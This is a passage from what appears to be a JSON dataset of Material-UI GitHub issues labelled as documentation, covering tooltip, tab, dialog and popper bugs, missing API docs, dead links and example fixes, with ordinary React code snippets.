-->\r\n\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Summary 💡\r\n\r\nThere should be a new entry Transition under Customization => Theme. Here one could see the api for the _transition.create function_. Additionally, it should mention that adding two transitions element for example for hover to enable a fade out transition.\r\n\r\nThank you!"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nI'm using the Tooltip component with a button as child, which get disabled when you click on it. The tooltip stay on screen when the button is disabled.\r\nThe doc says to [put a span](https://material-ui.com/components/tooltips/#disabled-elements) before the disabled element, but it still have the same behavior.\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\nThe tooltip disappear onMouseLeave even if the child is disabled\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\nI made a small Code SandBox example of the issue: https://codesandbox.io/embed/tooltip-disable-pqess\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\nThe first example is without the `<span>` tag enclosing the child.\r\nThe second is with the `<span>` tag enclosing the child.\r\nWhen clicking on the button, it will get disabled. The tooltip stays displayed no matter what\r\nSteps:\r\n\r\n1. Hover the button: the tooltip get displayed (fine)\r\n2. Leave the button: the tooltip disappears (fine)\r\n3. Click on the button, the tooltip will still be displayed even if you leave it\r\n\r\n## Context 🔦\r\nI'm using it to display an action button. So when you click it i fetch some data, and while fetching the button is disabled\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.3.0  |\r\n| React       |v16.8.6         |\r\n| Browser     |  Chrome       |\r\n| TypeScript  | v3.2.2        |\r\n"},{"labels":[null,"documentation",null,null],"text":"On [material design react components repo](https://github.com/material-components/material-components-web-react/tree/master/packages/top-app-bar) they have a component that helps when the top bar is fixed:\r\n\r\n> Use the `<TopAppBarFixedAdjust />` component to give your content top-padding, so it isn't hidden on page render.\r\n\r\nI've made one based on material UI that helps, so you could integrate it.\r\n\r\n```\r\nimport React from \"react\";\r\nimport { makeStyles } from \"@material-ui/styles\";\r\n\r\nconst useStyles = makeStyles(theme => ({\r\n  offset: {\r\n    ...theme.mixins.toolbar,\r\n    flexGrow: 1\r\n  }\r\n}))\r\n\r\nexport default function AppBarOffset() {\r\n  const classes = useStyles();\r\n  return <div className={classes.offset} />;\r\n}\r\n```\r\n\r\nUse as:\r\n\r\n```\r\n<AppBar position=\"fixed\" />\r\n<AppBarOffset />\r\n```\r\n\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate."},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nUsing arrow tooltips and placing it on the left or right side of the element creates an unaligned arrow.\r\n\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nThe arrow should align to the middle\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/4228360/62212630-8841bb00-b377-11e9-80c8-5e4870a1f6c0.png)\r\n\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nThe arrow doesn't align to the middle due to a `top` style added to it that has a lower value than it should to align the arrow to the middle:\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/4228360/62212501-3bf67b00-b377-11e9-9c86-ec548d814d9c.png)\r\n![image](https://user-images.githubusercontent.com/4228360/62213676-d8ba1800-b379-11e9-9ba3-967e305b2d05.png)\r\n\r\n\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nCodesandbox straight out of material-ui page, only added the `placement` prop. Hover any of the middle elements.\r\n\r\n1. https://codesandbox.io/s/material-demo-4jzbx\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nI was trying to have an arrowed tooltip that opens to the left of the hovered element.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.3.0  |\r\n| React        |   16.8.6      |\r\n| Browser      |    Tested on Safari and Chrome on MacOS both latest version     |\r\n| TypeScript   |     3.5.3    |\r\n"},{"labels":["documentation"],"text":"Not able to find the exact supported version for a particular version of MUI\r\n\r\n## Expected Behaviour\r\nSupported version\r\n`React >=16.x`\r\n_Just an example_\r\n\r\nAlso, a table listing\r\n\r\n| Material-UI | React |\r\n| -------------|------|\r\n| v4 | ^16.8.0 (hooks) |\r\n| v3 | ^16.3.0 (context) |\r\n| v1 | ^16.3.0 (context) |\r\n| v0.20 | >= 15.4.0 |\r\n\r\nRelated #16828\r\n"},{"labels":["documentation",null],"text":"The current `Component Demo` only includes source written in JS and TS, Which uses the latest feature for internal state management called `react hooks`.\r\n\r\n## Expected Behavior 🤔\r\nWhile working on a year old project (which does not support hooks). It was a bit harder to make demos up and running.\r\n\r\n## Current Behavior 😯\r\nNo docs for class-based components.\r\n\r\n## Examples 🌈\r\n```js\r\nclass comp extends React.Component\r\n{\r\n state = {\r\n   open: true,\r\n }\r\n..\r\n...\r\n\r\n}\r\n```\r\n## Context 🔦\r\nReact hooks in a great feature, but it's still new and legacy codebase can't support it. As upgrading react as a dependency comes with a lot of breaking changes on the other deps. Hence few users still prefer demos in class-based comps.\r\n"},{"labels":[null,"documentation"],"text":"**Description**\r\nIn the docs, the import of the module in the same namespace has been done using multiple import statements.\r\n\r\nCurrent behaviour\r\n\r\n```js\r\nimport AppBar from '@material-ui/core/AppBar';\r\nimport Toolbar from '@material-ui/core/Toolbar';\r\nimport Typography from '@material-ui/core/Typography';\r\nimport Button from '@material-ui/core/Button';\r\n```\r\nProposed Behaviour\r\n\r\n```js\r\nimport {AppBar, Toolbar, Typography, Button} from '@material-ui/core';\r\n```\r\n**Why so**\r\nNamed imports help to keep track of imports from a specific package, as well as makes code a bit cleaner.\r\n\r\nLet's discuss: loudspeaker: \r\n"},{"labels":[null,"documentation"],"text":"Hi,\r\n\r\nIt appears that alot of links are dead / not there when you are inside the API documentation, for example from:\r\nhttps://material-ui.com/api/avatar/\r\nI cannot navigate to 'Getting started' or 'Components'. I can navigate to all other menu entries within the API and also the 'Premium themes' but all other high level menu entries are dead. Could not find an open issue for this."},{"labels":[null,"documentation"],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nWhen orientation set to 'vertical' on Tabs props, tabs should display vertically\r\n\r\n## Current Behavior 😯\r\nTabs displayed horizontally.\r\n\r\nCreated same sample in Tabs documentation Vertical Tabs example in codesandbox link below.\r\nhttps://codesandbox.io/s/late-butterfly-m2r44\r\n\r\n![image](https://user-images.githubusercontent.com/651202/61925201-3e04a800-af39-11e9-93f3-3ffec088ca06.png)\r\n\r\nCode Sample from documentation \r\n```\r\nimport React from \"react\";\r\nimport PropTypes from \"prop-types\";\r\nimport { makeStyles } from \"@material-ui/core/styles\";\r\nimport Tabs from \"@material-ui/core/Tabs\";\r\nimport Tab from \"@material-ui/core/Tab\";\r\nimport Typography from \"@material-ui/core/Typography\";\r\nimport Box from \"@material-ui/core/Box\";\r\n\r\nfunction TabPanel(props) {\r\n  const { children, value, index, ...other } = props;\r\n\r\n  return (\r\n    <Typography\r\n      component=\"div\"\r\n      role=\"tabpanel\"\r\n      hidden={value !== index}\r\n      id={`vertical-tabpanel-${index}`}\r\n      aria-labelledby={`vertical-tab-${index}`}\r\n      {...other}\r\n    >\r\n      <Box p={3}>{children}</Box>\r\n    </Typography>\r\n  );\r\n}\r\n\r\nTabPanel.propTypes = {\r\n  children: PropTypes.node,\r\n  index: PropTypes.any.isRequired,\r\n  value: PropTypes.any.isRequired\r\n};\r\n\r\nfunction a11yProps(index) {\r\n  return {\r\n    id: `vertical-tab-${index}`,\r\n    \"aria-controls\": `vertical-tabpanel-${index}`\r\n  };\r\n}\r\n\r\nconst useStyles = makeStyles(theme => ({\r\n  root: {\r\n    flexGrow: 1,\r\n    backgroundColor: theme.palette.background.paper,\r\n    display: \"flex\",\r\n    height: 224\r\n  },\r\n  tabs: {\r\n    borderRight: `1px solid ${theme.palette.divider}`\r\n  }\r\n}));\r\n\r\nexport default function VerticalTabs() {\r\n  const classes = useStyles();\r\n  const [value, setValue] = React.useState(0);\r\n\r\n  function handleChange(event, newValue) {\r\n    setValue(newValue);\r\n  }\r\n\r\n  return (\r\n    <div className={classes.root}>\r\n      <Tabs\r\n        orientation=\"vertical\"\r\n        variant=\"scrollable\"\r\n        value={value}\r\n        onChange={handleChange}\r\n        aria-label=\"Vertical tabs example\"\r\n        className={classes.tabs}\r\n      >\r\n        <Tab label=\"Item One\" {...a11yProps(0)} />\r\n        <Tab label=\"Item Two\" {...a11yProps(1)} />\r\n        <Tab label=\"Item Three\" {...a11yProps(2)} />\r\n        <Tab label=\"Item Four\" {...a11yProps(3)} />\r\n        <Tab label=\"Item Five\" {...a11yProps(4)} />\r\n        <Tab label=\"Item Six\" {...a11yProps(5)} />\r\n        <Tab label=\"Item Seven\" {...a11yProps(6)} />\r\n      </Tabs>\r\n      <TabPanel value={value} index={0}>\r\n        Item One\r\n      </TabPanel>\r\n      <TabPanel value={value} index={1}>\r\n        Item Two\r\n      </TabPanel>\r\n      <TabPanel value={value} index={2}>\r\n        Item Three\r\n      </TabPanel>\r\n      <TabPanel value={value} index={3}>\r\n        Item Four\r\n      </TabPanel>\r\n      <TabPanel value={value} index={4}>\r\n        Item Five\r\n      </TabPanel>\r\n      <TabPanel value={value} index={5}>\r\n        Item Six\r\n      </TabPanel>\r\n      <TabPanel value={value} index={6}>\r\n        Item Seven\r\n      </TabPanel>\r\n    </div>\r\n  );\r\n}\r\n```\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nAt https://material-ui.com/customization/color/#color-tool, clicking on the button \"Reset Docs Colors\" results in a white splash page with the text `An unexpected error has occurred.` I have tested in Chrome and Firefox.\r\n\r\nThe error in the console:\r\n```\r\ncommons.e98f46a2b39a45ee03e2.js:1 Error: Unrecognized type RESET_COLORS\r\n    at commons.e98f46a2b39a45ee03e2.js:1\r\n    at Object.ra [as useReducer] (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at Object.useReducer (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at k (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at Jo (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at Fa (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at za (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at Ji (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at Qi (commons.e98f46a2b39a45ee03e2.js:1)\r\n    at Iu (commons.e98f46a2b39a45ee03e2.js:1)\r\n```\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nClicking on \"Reset Docs Colors\" results in setting the website to the default theme.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Chrome      | 75.0.3770.142 (Official Build) (64-bit) |\r\n| Firefox Quantum | 67.0.4 (64-bit) |\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nBackdropProps are not documented as Dialog element attribute\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nBackdropProps property should be documented \r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behaviour.\r\n-->\r\nNo way of knowing how to adjust styling for Backdrop element through DIalog element\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n```\r\n<Dialog\r\nonClose={handleClose}\r\naria-labelledby=\"customized-dialog-title\"\r\nPaperProps={{square: true}}\r\nBackdropProps={{\r\nclasses: {\r\n  root: classes.dialog\r\n }\r\n}}\r\nopen={props.show} \r\n>\r\n```\r\nhttps://material-ui.com/api/dialog => ctrl+f =>  \"BackdropProps\" no results "},{"labels":["documentation",null],"text":"Hello!\r\nThank you for your excellent work and legible documentation.\r\n\r\nLink:\r\nhttps://material-ui.com/ru/styles/advanced/#withstyles\r\n\r\n## Context 🔦\r\nmissed parenthesis:\r\n`const Nested = withStyles({\r\n  root: {}, // a style rule\r\n  label: {}, // a nested style rule\r\n})**( HERE**({ classes }) => (\r\n  <button className={classes.root}>\r\n    <span className={classes.label}> // 'jss2 my-label'\r\n      Nested\r\n    </span>\r\n  </button>\r\n));`\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.2  |\r\n| React        |  ✔  |\r\n| Browser      | ✔ |\r\n| TypeScript   |  ✔  |\r\n| etc.         |    👍    |\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nThe new version of TextField loses focus when the InputAdornment is clicked. This seems undesirable.\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nThe older (v1) TextField retains focus when Adornment is clicked:\r\n![ezgif com-video-to-gif](https://user-images.githubusercontent.com/24360164/61582532-e9000680-aae0-11e9-9ddf-bec8bd995a87.gif)\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nThe new TextField loses focus when Adornment is clicked:\r\n![ezgif com-video-to-gif (1)](https://user-images.githubusercontent.com/24360164/61582556-282e5780-aae1-11e9-94b4-eb5c7c78419e.gif)\r\n\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\n\r\nCompare versions\r\nv1: [https://v1.material-ui.com/demos/text-fields/#input-adornments](https://v1.material-ui.com/demos/text-fields/#input-adornments)\r\nv4: [https://material-ui.com/components/text-fields/#input-adornments](https://material-ui.com/components/text-fields/#input-adornments)\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nThis behavior is annoying for password fields or any other field that the user might want to keep editing after clicking an adornment. \r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.2.1  |\r\n| Browser      |     all    |\r\n"},{"labels":["documentation"],"text":"I've got dark mode enabled on my OS & Firefox. The black favicon is really hard to see when a docs tab isn't active.\r\n\r\n![image](https://user-images.githubusercontent.com/379519/61426209-990a1f80-a8e7-11e9-80a4-b3612ed9d5fe.png)\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nShow CSS API like https://material-ui.com/api/input-label/#css\r\n\r\n## Current Behavior 😯\r\nCSS API missing\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://material-ui.com/api/text-field/#css\r\n\r\n## Context 🔦\r\nI wanted to look up how to pass down a class to the helper Text\r\n\r\n## Your Environment 🌎\r\nOnline Documentation\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.2.0  |\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nWhen I set the dialog as fullWidth={true} I expect it to take whole screen up to maxWidth.\r\nOn mobile, width is calculated as \r\n`width: calc(100% - 96px);`, the 96px coming from the rule just below \r\n`margin: 48px;`.\r\nSo, it actually does not take full width and it just looks bad.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\nIt should take full width up to maxWidth as per the documentation. \r\n-->\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nIt takes width minus margin, which in the case is 48px at each side ( well, top and bottom as well, but that does not matter)\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink: [to sandbox ](https://codesandbox.io/s/jovial-diffie-7es5g)\r\n\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\nJust trying to have a full width feature to work properly. I did try to change the `paperFullWidth:` property, but that ends up changing the root element.\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.3  |\r\n| React        |  16.8.6      |\r\n| Browser      |  Firefox development latest      |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nWhen configuring the `Popper` component to display a pointer arrow, I expect the arrow will respond to theme changes, e.g. If my application is using a light theme I expect the Popper body and arrow to be white (in my case), however in dark mode the arrow remains white, despite the body of the Popper updating to black/grey.\r\n\r\n## Current Behavior 😯\r\nChanging from light to dark theme does not update the Popper arrow, it remains white as in the light theme.\r\n\r\n## Steps to Reproduce 🕹\r\nThe issue can be reproduced via the live example in the [MUI docs](https://material-ui.com/components/popper/#popper)\r\n1. Using the scroll playground example, configure the popper to display a pointer arrow\r\n2. Switch the site to use the dark theme\r\n3. Open the popper in the scroll playground example\r\n4. Note the colour of the pointer arrow\r\n\r\n## Your Environment 🌎\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.1.3 |\r\n| React        | v16.8.6 |\r\n| Browser      | Chrome |\r\n| TypeScript   | Not used |\r\n"},{"labels":["documentation",null],"text":"- [X] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nNavigating to [https://v1-5-0.material-ui.com/*](https://v1-5-0.material-ui.com/demos/buttons/) should redirect to [v1.material-ui.com/*](https://v1.material-ui.com/demos/buttons/) (e.g. https://v1-5-0.material-ui.com/demos/buttons/ should redirect to https://v1.material-ui.com/demos/buttons/)\r\n\r\n## Current Behavior 😯\r\nNavigating to [v1-5-0.material-ui.com](https://v1-5-0.material-ui.com) results in a 404 response\r\n\r\n## Context 🔦\r\nOur internal company documentation links to the old `v1-5-0.material-ui.com/*` links. Ideally we would just refactor the links to point to the new urls, but all our documentation is versioned by npm package version, and going back through all the old documentation builds to refactor the urls per npm version would be quite a difficult task. Whereas, I can imagine setting up a redirect might not be quite so difficult? What's in it for Material-UI? It would mean you would make Google happy. Google loves redirects ;)\r\n\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v1.5.x  |\r\n"},{"labels":["documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nWith Next9 just being released, I went through integration and ran into one minor error in the examples: specifically in the _document.js page.  \r\n\r\nIn `getInitialProps()`, you are currently showing:\r\n\r\n```typescript\r\n    return {\r\n      ...initialProps,\r\n      styles: (\r\n        <React.Fragment>\r\n          {sheets.getStyleElement()}\r\n          {flush() || null}\r\n        </React.Fragment>,\r\n      ),\r\n    };\r\n```\r\nIt seems that styles now expects an array of React Elements, so this fixed it for me:\r\n\r\n```typescript\r\n    return {\r\n      ...initialProps,\r\n      styles: [\r\n        <React.Fragment>\r\n          {sheets.getStyleElement()}\r\n          {flush() || null}\r\n        </React.Fragment>,\r\n      ],\r\n    };\r\n```\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\n1.\r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v4.?.?  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":[null,"documentation"],"text":"This kind of note in the documentation website:\r\n\r\n> Note: [this component] are no longer documented in the Material Design documentation.\r\n\r\nDoes that mean the component will be removed in the near future?\r\n\r\nOr it won't receive any improvement, bugs fixing, if any?\r\n\r\nWhat's the disadvantage of using those component?"},{"labels":[null,"documentation"],"text":"Listing various points that could be improved for searching our docs. Also documenting unhelpful search results. It's not about implementing all of those but exploring how viable they are or if they have better alternatives.\r\n\r\n- allow browsing results (currently limited to 5 results)\r\n- implement opensearch\r\n- improve a11y (they are announced as \"search result\" in chrome + NDVA)\r\n\r\nUnhelpful results:\r\n- \"FilledInput\" (top 5 results link to /api/filled-input page)"},{"labels":["documentation",null,null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nThe [FAQ](https://material-ui.com/getting-started/faq/) documentation states how to disable transitions with \r\n\r\n```jsx\r\nimport { createMuiTheme } from '@material-ui/core';\r\n\r\nconst theme = createMuiTheme({\r\n  transitions: {\r\n    // So we have `transition: none;` everywhere\r\n    create: () => 'none',\r\n  },\r\n});\r\n```\r\n\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nProgress bars should not animate.\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\nTransitions are not disabled. However if I add \r\n\r\n```js\r\nimport CssBaseline from \"@material-ui/core/CssBaseline\";\r\n```\r\n\r\nsomewhere in the rendering tree, transitions stop\r\n\r\n```jsx\r\n\t<MuiThemeProvider theme={theme}>\r\n      <div>\r\n        <CssBaseline />\r\n        <LinearProgress />\r\n        <br />\r\n        <LinearProgress color=\"secondary\" />\r\n      </div>\r\n    </MuiThemeProvider>\r\n```\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use 